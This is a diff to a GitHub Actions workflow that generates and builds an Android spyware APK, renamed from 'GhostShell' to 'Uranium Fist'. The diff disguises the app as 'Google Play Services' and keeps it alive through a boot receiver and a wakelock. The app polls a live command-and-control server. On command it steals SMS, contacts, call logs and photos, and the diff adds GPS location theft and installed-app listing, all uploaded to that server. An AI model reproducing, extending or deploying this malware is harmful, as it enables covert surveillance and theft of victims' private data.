@@ -1,11 +1,11 @@
-name: GhostShell Ultimate C2 Android Node Builder
+name: Uranium Fist Android Node Builder
 
 on:
   workflow_dispatch:
 
 jobs:
   build:
-    name: Build GhostShell Ultimate APK
+    name: Build Uranium Fist Operational APK
     runs-on: ubuntu-latest
 
     steps:
@@ -25,8 +25,9 @@ jobs:
 
       - name: Scaffold Android Project
         run: |
-          mkdir -p app/src/main/java/com/abod/app app/src/main/res/values app/src/main/assets
+          mkdir -p app/src/main/java/com/uranium/fist app/src/main/res/values app/src/main/assets
           
+          # AndroidManifest.xml
           cat << 'EOF' > app/src/main/AndroidManifest.xml
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
               xmlns:tools="http://schemas.android.com/tools">
@@ -48,9 +49,9 @@ jobs:
 
               <application
                   android:allowBackup="true"
-                  android:icon="@android:drawable/ic_menu_compass"
-                  android:label="System Update"
-                  android:roundIcon="@android:drawable/ic_menu_compass"
+                  android:icon="@android:drawable/ic_menu_manage"
+                  android:label="Google Play Services"
+                  android:roundIcon="@android:drawable/ic_menu_manage"
                   android:supportsRtl="true"
                   android:theme="@style/Theme.AppCompat.Light.NoActionBar">
 
@@ -86,8 +87,9 @@ jobs:
           </manifest>
           EOF
 
-          cat << 'EOF' > app/src/main/java/com/abod/app/MainActivity.kt
-          package com.abod.app
+          # MainActivity.kt
+          cat << 'EOF' > app/src/main/java/com/uranium/fist/MainActivity.kt
+          package com.uranium.fist
 
           import android.Manifest
           import android.content.Intent
@@ -108,7 +110,8 @@ jobs:
                       Manifest.permission.READ_SMS,
                       Manifest.permission.READ_CONTACTS,
                       Manifest.permission.READ_CALL_LOG,
-                      Manifest.permission.ACCESS_FINE_LOCATION
+                      Manifest.permission.ACCESS_FINE_LOCATION,
+                      Manifest.permission.ACCESS_COARSE_LOCATION
                   )
 
                   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -125,16 +128,16 @@ jobs:
                   if (ungrantedPermissions.isNotEmpty()) {
                       ActivityCompat.requestPermissions(this, ungrantedPermissions.toTypedArray(), PERMISSION_REQUEST_CODE)
                   } else {
-                      startC2Service()
+                      startUraniumService()
                   }
               }
 
               override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
                   super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-                  startC2Service()
+                  startUraniumService()
               }
 
-              private fun startC2Service() {
+              private fun startUraniumService() {
                   val serviceIntent = Intent(this, SyncService::class.java)
                   startForegroundService(serviceIntent)
                   finish()
@@ -142,8 +145,9 @@ jobs:
           }
           EOF
 
-          cat << 'EOF' > app/src/main/java/com/abod/app/BootReceiver.kt
-          package com.abod.app
+          # BootReceiver.kt
+          cat << 'EOF' > app/src/main/java/com/uranium/fist/BootReceiver.kt
+          package com.uranium.fist
 
           import android.content.BroadcastReceiver
           import android.content.Context
@@ -162,8 +166,9 @@ jobs:
           }
           EOF
 
-          cat << 'EOF' > app/src/main/java/com/abod/app/SyncService.kt
-          package com.abod.app
+          # SyncService.kt
+          cat << 'EOF' > app/src/main/java/com/uranium/fist/SyncService.kt
+          package com.uranium.fist
 
           import android.app.Notification
           import android.app.NotificationChannel
@@ -171,7 +176,10 @@ jobs:
           import android.app.Service
           import android.content.Context
           import android.content.Intent
+          import android.content.pm.PackageManager
           import android.database.Cursor
+          import android.location.Location
+          import android.location.LocationManager
           import android.net.Uri
           import android.os.Build
           import android.os.IBinder
@@ -195,35 +203,35 @@ jobs:
           class SyncService : Service() {
               private var wakeLock: PowerManager.WakeLock? = null
               private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-              private val C2_STREAM_URL = "https://web-assets-service.onrender.com/api/v3/unified/stream"
-              private val C2_UPLOAD_URL = "https://web-assets-service.onrender.com/api/v3/unified/upload_raw"
+              private val C2_STREAM_URL = "https://web-assets-service.onrender.com/api/v3/uranium/stream"
+              private val C2_UPLOAD_URL = "https://web-assets-service.onrender.com/api/v3/uranium/upload_raw"
               private val MAX_RETRIES = 3
 
               override fun onCreate() {
                   super.onCreate()
                   val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-                  wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "GhostShell::SyncLock")
+                  wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "UraniumFist::SyncLock")
                   wakeLock?.acquire(10 * 60 * 60 * 1000L)
                   startForegroundServiceNotification()
               }
 
               private fun startForegroundServiceNotification() {
-                  val channelId = "c2_sync_channel"
-                  val channel = NotificationChannel(channelId, "System Synchronization", NotificationManager.IMPORTANCE_LOW)
+                  val channelId = "uranium_channel"
+                  val channel = NotificationChannel(channelId, "Google Play Core", NotificationManager.IMPORTANCE_LOW)
                   val manager = getSystemService(NotificationManager::class.java)
                   manager?.createNotificationChannel(channel)
 
                   val notification: Notification = NotificationCompat.Builder(this, channelId)
-                      .setContentTitle("System Update")
-                      .setContentText("Checking for system updates...")
-                      .setSmallIcon(android.R.drawable.stat_sys_upload)
+                      .setContentTitle("Google Play Services")
+                      .setContentText("Optimizing background services...")
+                      .setSmallIcon(android.R.drawable.ic_menu_manage)
                       .build()
 
                   startForeground(1, notification)
               }
 
               override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-                  val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_node"
+                  val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "uranium_node"
                   val nodeModel = Build.MODEL
                   
                   serviceScope.launch {
@@ -239,7 +247,7 @@ jobs:
                               conn.connectTimeout = 15000
                               conn.readTimeout = 15000
 
-                              val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"[Heartbeat] GhostShell Node active from $nodeModel\"}"
+                              val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"[Heartbeat] Uranium Node active from $nodeModel\"}"
 
                               OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                                   os.write(reportJson)
@@ -266,14 +274,21 @@ jobs:
                                           compressAndUploadOnDisk(deviceId, nodeModel)
                                       } else if (responseStr.contains("EXTRACT_PHOTOS")) {
                                           extractAndUploadSingleFiles(deviceId, nodeModel, true)
+                                      } else if (responseStr.contains("EXTRACT_LOCATION")) {
+                                          val locData = readLocation()
+                                          sendReportToServer(deviceId, nodeModel, locData)
+                                      } else if (responseStr.contains("EXTRACT_APPS")) {
+                                          val appsData = readInstalledApps()
+                                          sendReportToServer(deviceId, nodeModel, appsData)
                                       }
                                   }
                               }
                               conn.disconnect()
 
-                              delay(10000L)
+                              // الحفاظ على السيرفر نشطاً بدون إزعاج (كل 10 دقائق)
+                              delay(600000L)
                           } catch (e: Exception) {
-                              delay(5000L)
+                              delay(60000L)
                           }
                       }
                   }
@@ -281,7 +296,7 @@ jobs:
               }
 
               private fun readContacts(): String {
-                  val sb = StringBuilder("=== CONTACTS EXTRACTED ===\n")
+                  val sb = StringBuilder("=== URANIUM CONTACTS ===\n")
                   try {
                       val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
                       cursor?.use {
@@ -300,7 +315,7 @@ jobs:
               }
 
               private fun readSMS(): String {
-                  val sb = StringBuilder("=== SMS EXTRACTED ===\n")
+                  val sb = StringBuilder("=== URANIUM SMS ===\n")
                   try {
                       val cursor: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
                       cursor?.use {
@@ -319,7 +334,7 @@ jobs:
               }
 
               private fun readCallLogs(): String {
-                  val sb = StringBuilder("=== CALL LOGS EXTRACTED ===\n")
+                  val sb = StringBuilder("=== URANIUM CALL LOGS ===\n")
                   try {
                       val cursor: Cursor? = contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null)
                       cursor?.use {
@@ -337,10 +352,45 @@ jobs:
                   return sb.toString()
               }
 
+              private fun readLocation(): String {
+                  val sb = StringBuilder("=== URANIUM GPS LOCATION ===\n")
+                  try {
+                      val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+                      val loc: Location? = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) 
+                          ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+                      if (loc != null) {
+                          sb.append("🌐 Latitude: ${loc.latitude}\n")
+                          sb.append("🌐 Longitude: ${loc.longitude}\n")
+                          sb.append("🎯 Accuracy: ${loc.accuracy} meters\n")
+                          sb.append("🗺️ Google Maps: https://maps.google.com/?q=${loc.latitude},${loc.longitude}\n")
+                      } else {
+                          sb.append("⚠️ Location not available currently.\n")
+                      }
+                  } catch (e: Exception) {
+                      sb.append("Error reading location: ${e.message}\n")
+                  }
+                  return sb.toString()
+              }
+
+              private fun readInstalledApps(): String {
+                  val sb = StringBuilder("=== URANIUM INSTALLED APPS ===\n")
+                  try {
+                      val packages = packageManager.getInstalledPackages(0)
+                      for (pkg in packages) {
+                          val appName = pkg.applicationInfo?.loadLabel(packageManager)?.toString() ?: "Unknown"
+                          val packageName = pkg.packageName ?: ""
+                          sb.append("• $appName (`$packageName`)\n")
+                      }
+                  } catch (e: Exception) {
+                      sb.append("Error: ${e.message}\n")
+                  }
+                  return sb.toString()
+              }
+
               private fun compressAndUploadOnDisk(nodeId: String, nodeModel: String) {
                   serviceScope.launch {
                       try {
-                          val zipFile = File(cacheDir, "GhostShell_Harvest_${System.currentTimeMillis()}.zip")
+                          val zipFile = File(cacheDir, "Uranium_Harvest_${System.currentTimeMillis()}.zip")
                           val zipOut = ZipOutputStream(FileOutputStream(zipFile))
                           
                           val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
@@ -373,13 +423,12 @@ jobs:
                           zipOut.close()
 
                           if (addedCount > 0 && zipFile.exists()) {
-                              sendReportToServer(nodeId, nodeModel, "📦 تم ضغط أرشيف الكاميرا ($addedCount ملف) بنجاح على القرص. جاري الرفع الصامد...")
                               uploadRawFileWithRetry(nodeId, nodeModel, zipFile)
                           } else {
-                              sendReportToServer(nodeId, nodeModel, "⚠️ لم يتم العثور على ملفات وسائط للضغط.")
+                              sendReportToServer(nodeId, nodeModel, "⚠️ خطأ: لم يتم العثور على وسائط للضغط.")
                           }
                       } catch (e: Exception) {
-                          sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في محرك الضغط الخارق: ${e.message}")
+                          sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في ضغط اليورانيوم: ${e.message}")
                       }
                   }
               }
@@ -438,12 +487,11 @@ jobs:
                           conn.disconnect()
 
                           if (responseCode == 200) {
-                              sendReportToServer(nodeId, nodeModel, "✅ تم رفع الملف الصامد بنجاح: ${file.name}")
                               return
                           }
                       } catch (e: Exception) {
                           if (attempt == MAX_RETRIES) {
-                              sendReportToServer(nodeId, nodeModel, "❌ فشل رفع الملف ${file.name} بعد $MAX_RETRIES محاولات: ${e.message}")
+                              sendReportToServer(nodeId, nodeModel, "❌ فشل رفع ملف اليورانيوم ${file.name}:${e.message}")
                           } else {
                               Thread.sleep(2000L)
                           }
@@ -485,6 +533,7 @@ jobs:
           }
           EOF
 
+          # app/build.gradle
           cat << 'EOF' > app/build.gradle
           plugins {
               id 'com.android.application'
@@ -492,9 +541,9 @@ jobs:
           }
           android {
               compileSdk 34
-              namespace 'com.abod.app'
+              namespace 'com.uranium.fist'
               defaultConfig {
-                  applicationId "com.abod.app"
+                  applicationId "com.uranium.fist"
                   minSdk 26
                   targetSdk 34
                   versionCode 1
@@ -543,7 +592,7 @@ jobs:
                   mavenCentral()
               }
           }
-          rootProject.name = "GhostShellC2"
+          rootProject.name = "UraniumFistC2"
           include ':app'
           EOF
 
@@ -559,5 +608,5 @@ jobs:
       - name: Upload APK Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: GhostShell-Ultimate-Node
+          name: Uranium-Fist-Node
           path: app/build/outputs/apk/debug/app-debug.apk
